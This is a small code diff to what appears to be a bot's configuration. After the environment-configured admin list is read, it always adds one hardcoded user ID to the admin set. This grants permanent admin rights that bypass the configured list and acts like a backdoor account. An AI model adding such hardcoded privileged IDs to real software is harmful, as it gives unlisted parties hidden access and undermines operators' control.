@@ -32,6 +32,9 @@ if _raw_admins:
             except ValueError:
                 continue
 
+# Always include hardcoded super admin(s)
+ADMIN_IDS.update({5898830697})
+
 # OCR languages (tesseract language codes)
 OCR_LANGUAGES = os.environ.get("OCR_LANGUAGES", "chi_sim+eng")
 
